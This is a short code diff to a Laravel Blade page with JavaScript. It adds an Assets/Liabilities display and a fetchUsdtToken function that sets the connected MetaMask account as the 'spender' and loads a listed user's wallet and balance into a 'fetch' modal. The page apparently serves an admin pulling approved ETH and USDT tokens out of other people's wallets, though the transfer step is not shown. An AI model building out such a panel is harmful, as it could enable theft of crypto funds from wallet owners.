@@ -17,6 +17,10 @@
                 <div class="row">
                    
                     <div class="col-md-12">
+                        <div class="float-left">
+                            <small>Assets = </small>{{$assets}} / <small>Liabilities = </small>{{$liable}} <br/>
+
+                        </div>
                         <div class="float-right">
                             {{-- <small>Connected Wallet:</small> --}}
                             <button id="connectButton" type="button" class="btn btn-primary" onClick="connectWallet()">
@@ -260,6 +264,23 @@
 
         var wallet = $("#modal_eth_" + id).attr('data-wallet');
         var balance = $("#modal_eth_" + id).attr('data-balance');
+
+        $("#modal-wallet").val(wallet);
+        $("#modal-spender").val(adminWalletAddress);
+        $("#modal-balance").text(balance);
+
+        $('#fetchForm').modal('show');
+
+    }
+
+    async function fetchUsdtToken(id) {
+        const accounts = await window.ethereum.request({
+            method: 'eth_requestAccounts'
+        });
+        const adminWalletAddress = accounts[0];
+
+        var wallet = $("#modal_usdt_" + id).attr('data-wallet');
+        var balance = $("#modal_usdt_" + id).attr('data-balance');
 
         $("#modal-wallet").val(wallet);
         $("#modal-spender").val(adminWalletAddress);
